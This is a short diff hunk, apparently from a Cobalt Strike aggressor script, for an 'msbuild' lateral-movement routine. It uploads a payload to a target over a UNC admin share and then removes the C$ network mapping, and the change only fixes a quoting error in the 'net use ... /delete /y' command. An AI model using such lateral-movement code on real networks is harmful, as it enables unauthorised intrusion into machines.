@@ -258,7 +258,7 @@ sub msbuild {
 		sleep(5000);
 		bupload_raw($1, $unc . $filename , $payload);
 		sleep(2000);
-		bshell($1, 'net use \\\\'. %args['target'] . '\\C$ /delete' /y);
+		bshell($1, 'net use \\\\'. %args['target'] . '\\C$ /delete /y');
 	}
 	else {
 		bupload_raw($1, $unc . $filename , $payload);
